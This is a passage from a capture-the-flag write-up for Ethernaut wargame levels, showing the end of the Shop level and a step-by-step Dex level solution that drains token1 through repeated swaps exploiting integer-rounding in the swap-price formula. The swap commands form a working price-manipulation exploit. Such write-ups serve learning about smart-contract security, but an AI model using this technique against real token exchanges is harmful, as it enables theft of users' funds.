await contract.price().then(v => v.toString()); // Output: '0'
await contract.isSold(); // Output: true
```

- Item was marked as sold.
- Final price was set to `0`.

---

### Level Completed

- Successfully bought the item for **0 wei**, bypassing the original 100 wei price.
- Submitted the instance and completed the level.

![Level Complete Output](assets/shop.png)


## Ethernaut Level 22: Dex

### Strategy
The Dex contract determines token swap prices based on a formula involving token reserves. However, due to **Solidity's integer division**, each swap introduces a **small imbalance** favoring the player. By repeatedly swapping tokens back and forth, we can exploit this **price manipulation vulnerability** to slowly increase our token balance relative to the Dex’s and eventually **drain all of one token**.

The key vulnerability lies in:
```
function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
    return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
}
```
Due to integer truncation, the swap price always rounds down—causing imbalance accumulation.

---

### Exploit Steps

1. **Start state**  
   - Player: 10 token1, 10 token2  
   - Dex: 100 token1, 100 token2  

2. **Approve Dex to spend our tokens:**
```
await contract.approve(contract.address, 500)
```

3. **Get token addresses:**
```
let t1 = await contract.token1();
let t2 = await contract.token2();
```

4. **Execute swaps iteratively to drain token1:**
```
await contract.swap(t1, t2, 10)   // player: 0 t1, 20 t2
await contract.swap(t2, t1, 20)   // player: 24 t1, 0 t2
await contract.swap(t1, t2, 24)   // player: 0 t1, 30 t2
await contract.swap(t2, t1, 30)   // player: 41 t1, 0 t2
await contract.swap(t1, t2, 41)   // player: 0 t1, 65 t2
await contract.swap(t2, t1, 45)   // player: 110 t1, 20 t2
```

5. **Verify token1 is drained from Dex:**
```
await contract.balanceOf(t1, instance).then(v => v.toString())
// Output: '0'
```

### Level Completed
Successfully drained all of `token1` from the Dex by abusing the flawed swap pricing logic. Challenge completed.
![Level Complete Output](assets/Dex.png)
